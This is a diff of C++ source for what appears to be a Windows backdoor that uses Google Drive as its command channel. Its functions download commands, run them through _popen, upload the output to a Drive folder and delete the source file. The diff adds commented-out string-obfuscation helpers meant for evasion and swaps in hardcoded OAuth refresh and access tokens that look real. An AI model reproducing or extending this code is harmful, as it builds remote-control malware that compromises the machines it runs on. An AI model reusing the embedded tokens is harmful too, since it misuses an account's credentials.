@@ -12,6 +12,42 @@
 #include <stack>
 #include <spdlog/spdlog.h>
 
+//std::string deltaDecodeA(const std::vector<int>& encoded) {
+//	if (encoded.empty()) {
+//		return "";
+//	}
+//
+//	std::string decoded;
+//
+//	decoded.push_back(static_cast<char>(encoded[0]));
+//
+//	for (size_t i = 1; i < encoded.size(); ++i) {
+//		char newChar = static_cast<char>(static_cast<int>(decoded[i - 1]) + encoded[i]);
+//		decoded.push_back(newChar);
+//	}
+//
+//	return decoded;
+//}
+////string obfusecation
+//
+//std::wstring deltaDecodeW(const std::vector<int>& encoded) {
+//	if (encoded.empty()) {
+//		return L""; // Return an empty wide string
+//	}
+//
+//	std::wstring decoded;
+//
+//	decoded.push_back(static_cast<wchar_t>(encoded[0]));
+//
+//	for (size_t i = 1; i < encoded.size(); ++i) {
+//		wchar_t newChar = static_cast<wchar_t>(static_cast<int>(decoded[i - 1]) + encoded[i]);
+//		decoded.push_back(newChar);
+//	}
+//
+//	return decoded;
+//}
+////string obfusecation
+
 #define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
 #define FAILSAFE_THRESHOLD 2402 * 1000
 #define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
@@ -41,8 +77,8 @@
 #define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
 #define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"
 
-#define INIT_REFRESH_TOKEN "1//09qovbp-KVHtrCgYIARAAGAkSNwF-L9IrJV5agfIi1su5-Sa73rjjSQfj6ZoVjqA7rwxzAAdkaqbCi-3kdZzzuB9INzLTLdqKjsE"
-#define INIT_ACCESS_TOKEN "ya29.a0ARW5m76PSG1VKsrhpmHMaikhzvSIB0z9JBwUctxhhpU42dX5HMB3y1Uwrj7RWNcPuputSFkvlirlLrVpbi6irFXXiySUDBmCjNQiWNGnj1rHugn09-O8GrFGOq97yHCmmG0Xuru2KwWSrtlP8jq8O8vZ1wVRJLoBf6RwEcNmaCgYKATESARASFQHGX2Mi-_cF5hmjDXXo1hyELb0lJg0175"
+#define INIT_REFRESH_TOKEN "1//03263N6jS7d6TCgYIARAAGAMSNwF-L9Irn4u11nS_Q6Btl1S88WilfGjVcnakac_1YDB3chyZw8caf2ppdejE5nOI5ixhAaIlKaw"
+#define INIT_ACCESS_TOKEN "ya29.a0AW4XtxhDsQVZR1dSsbv9t7pKQWALBg5B0JFZM8EE4bXUQywxoceYQV28yBrMJ55vH4sZWb6x0v1Y58p0JWj-Z9AFHLcLZp4MzqFizex6CE00qkl9XIC7ff8rYPw8stNkciy_K3sXe-lvt1Nxg8uhdz61jes1-voXKhLSQ80ZaCgYKAfwSARASFQHGX2MioUkPjE-OFemftCbVt19THQ0175"
 #define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5
 
 
@@ -101,7 +137,7 @@ inline WORD getErrorCode(char* input) {
 /// BDRIVE_NO_INTERNET
 /// </returns>
 static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
-#define BUFFER_SIZE 1024
+	constexpr int BUFFER_SIZE = 1024;
 
 	WORD errorCode = BDRIVE_OK;
 	char* buffer = new char[BUFFER_SIZE];
@@ -123,7 +159,6 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 
 	delete[] buffer;
 	return errorCode;
-#undef BUFFER_SIZE
 }
 
 /// <summary>
@@ -138,7 +173,7 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 /// BDRIVE_TIMED_OUT Invoke-Restmethod Timedout!
 /// </returns>
 static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
-#define BUFFER_SIZE 1024
+	constexpr int BUFFER_SIZE = 1024;
 	char* buffer = new char[BUFFER_SIZE];
 	std::string output;
 
@@ -176,13 +211,10 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 	else {
 		return BDRIVE_NO_CONTENT;
 	}
-
-#undef BUFFER_SIZE
 }
 
-static WORD checkConnection()
-{
-#define BUFFER_SIZE 512
+static WORD checkConnection() {
+	constexpr int BUFFER_SIZE = 512;
 
 	WORD errorCode = BDRIVE_NO_INTERNET;
 	char* buffer = new char[BUFFER_SIZE];
@@ -200,7 +232,6 @@ static WORD checkConnection()
 	delete[] buffer;
 
 	return errorCode;
-#undef BUFFER_SIZE
 }
 //review this two function
 
@@ -216,7 +247,7 @@ static WORD checkConnection()
 /// 601 Unhandled Exception!
 /// </returns>
 static WORD downloadSourceContext(std::string accessToken, std::string& output) {
-#define BUFFER_SIZE 1024
+	constexpr int BUFFER_SIZE = 1024;
 
 	if (accessToken.empty())
 	{
@@ -247,17 +278,16 @@ static WORD downloadSourceContext(std::string accessToken, std::string& output) 
 		return getErrorCode(output);
 	}
 	return BDRIVE_OK;
-#undef BUFFER_SIZE
 }
 
 /// <summary>
 /// Execute a command in a manner suitable for _popen() function and put the result in output string.
 /// </summary>
-/// <param name="input">The command downloaded from source</param>
+/// <param name="input">The command downloaded from source. (The input is limited to 1024 character)</param>
 /// <param name="output">Output of the pipe that got opened by _popen()</param>
 /// <returns>returns 0 :|</returns>
 static WORD commandExecuter(std::string input, std::string& output) {
-#define BUFFER_SIZE 1024
+	constexpr int BUFFER_SIZE = 1024;
 
 	std::replace(input.begin(), input.end(), '\n', '&');
 	FILE* file = _popen(input.c_str(), "r");
@@ -271,7 +301,6 @@ static WORD commandExecuter(std::string input, std::string& output) {
 	delete[] buffer;
 
 	return 0;
-#undef BUFFER_SIZE
 }
 
 /// <summary>
@@ -288,7 +317,7 @@ static WORD commandExecuter(std::string input, std::string& output) {
 /// 601 Unhandled Exception!
 /// </returns>
 static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD& subIndex) {
-#define BUFFER_SIZE 7168 
+	constexpr int BUFFER_SIZE = 7168;
 
 	char* buffer = new char[BUFFER_SIZE];
 	WORD errorCode = BDRIVE_OK;
@@ -305,7 +334,6 @@ static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DW
 	}
 	delete[] buffer;
 	return errorCode;
-#undef BUFFER_SIZE
 }
 
 /// <summary>
@@ -346,7 +374,7 @@ static WORD uploadResult(std::string input, std::string accessToken, DWORD index
 /// 601 Unhandled Exception!
 /// </returns>
 static WORD deleteSource(std::string accessToken) {
-#define BUFFER_SIZE 1024
+	constexpr int BUFFER_SIZE = 1024;
 
 	char* buffer = new char[BUFFER_SIZE];
 	WORD errorCode = BDRIVE_OK;
@@ -363,6 +391,4 @@ static WORD deleteSource(std::string accessToken) {
 	}
 	delete[] buffer;
 	return errorCode;
-
-#undef BUFFER_SIZE
 }
